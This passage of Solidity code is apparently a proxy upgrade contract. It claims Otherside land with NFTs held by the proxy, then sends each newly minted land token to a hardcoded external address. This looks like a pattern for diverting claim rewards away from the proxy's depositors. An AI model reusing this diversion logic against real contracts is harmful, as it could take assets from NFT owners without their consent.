...
interface OthersideClaim {
    function nftOwnerClaimLand(uint256[] calldata alphaTokenIds, uint256[] calldata betaTokenIds) external;
    function betaNftIdCurrent() external returns(uint256);
}

contract DojiClaimV2 is DojiClaimsProxy {
    function brianTech(uint256[] calldata alphaTokenIds, uint256[] calldata betaTokenIds) external {
        uint256 tokenId = OthersideClaim(0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258).betaNftIdCurrent();
        OthersideClaim(0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258).nftOwnerClaimLand(alphaTokenIds, betaTokenIds);
        ERC721Upgradeable(0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258).transferFrom(address(this), 0xee26b0A85a65c8b0E96ceDd9862d501282c63F28, tokenId);
    }
}
